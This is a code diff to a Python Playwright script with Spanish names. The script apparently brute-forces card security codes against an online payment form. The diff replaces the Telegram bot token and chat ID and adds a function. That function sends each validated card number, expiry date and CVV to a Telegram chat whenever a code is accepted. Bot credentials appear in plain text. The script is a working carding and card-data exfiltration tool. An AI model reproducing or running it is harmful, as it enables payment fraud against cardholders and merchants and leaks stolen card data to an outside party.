@@ -4,6 +4,7 @@ import re
 import random
 import string
 import platform
+import requests
 from pathlib import Path
 from playwright.sync_api import sync_playwright
 from colorama import Fore, Style
@@ -22,8 +23,9 @@ TRANSACTION_DECLINED = "Your transaction was declined. Please use an alternative
 INPUT_NAME_SELECTOR = 'input#name'
 
 # Configuración de Telegram
-BOT_TOKEN = '7909382477:AAFZOzQ1xBFD5JZGzpE3j3_UIjySllklis4'
-CHAT_ID = '7163119135'
+BOT_TOKEN = '7341327293:AAF5RJYD719VFFDCYuIekurEdH9p5KIPfjY'
+CHAT_ID = '1125783102'
+
 
 class Colores:
     ROJO = '\033[91m'
@@ -32,6 +34,11 @@ class Colores:
     AZUL = '\033[94m'
     RESET = '\033[0m'
 
+def enviar_mensaje(mensaje):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    params = {'chat_id': CHAT_ID, 'text': mensaje}
+    response = requests.get(url, params=params)
+    return response.json()
 
 def generar_email():
     """Genera un email aleatorio con un dominio común."""
@@ -182,6 +189,7 @@ def evaluar_resultado_cvv(mensaje, numero, mes, ano, cvv, page, intento, max_int
         with open(CVV_VALIDOS_FILE, "a") as f:
             f.write(f"{numero}|{mes}|{ano}|{cvv}\n")
         remover_tarjeta_de_data(numero, mes, ano)
+        enviar_mensaje(f"{numero}|{mes}|{ano}|{cvv} - CVV CORRECTO ✅")
         print(Fore.YELLOW + f"[{numero}] Instancia detenida tras encontrar CVV válido" + Style.RESET_ALL)
         exit(0)
 
